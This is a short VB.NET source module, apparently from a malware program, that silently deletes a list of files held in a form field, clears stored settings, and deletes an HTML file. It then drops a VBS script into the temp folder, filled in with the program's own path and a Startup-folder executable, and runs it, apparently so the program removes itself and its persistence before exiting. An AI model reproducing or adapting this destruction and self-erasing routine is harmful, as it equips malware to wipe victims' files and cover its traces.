﻿Module del
    Sub del()
        On Error Resume Next
        For Each filename In Form4.listenc
            If IO.File.Exists(filename) Then
                IO.File.Delete(filename)
            End If
        Next

        SaveSetting("P", "0", St.Setting, "")
        SaveSetting("H", "0", St.Setting, "") ' clear old Setting
        SaveSetting("M", "0", St.Setting, "")
        SaveSetting("S", "0", St.Setting, "")
        SaveSetting("X", "0", St.Setting, "")
        SaveSetting("D", "0", St.Setting, "")
        SaveSetting("T", "0", St.Setting, "")
        SaveSetting("G", "0", St.Setting, "")
        SaveSetting("F", "0", St.Setting, "")
        SaveSetting("C", "0", St.Setting, "")

        If IO.File.Exists(St.html) Then
            IO.File.Delete(St.html)
        End If
        Dim stb As String = My.Resources.del
        Dim pathh As String = IO.Path.GetTempPath & "del.vbs"
        stb = stb.Replace("%path%", Application.ExecutablePath)
        stb = stb.Replace("%startup%", Environment.GetFolderPath(7) & "\" & St.mute & ".exe")
        Dim objWriter As New System.IO.StreamWriter(pathh, False)
        objWriter.WriteLine(stb)
        objWriter.Close()
        Process.Start(pathh)
        End
    End Sub
End Module
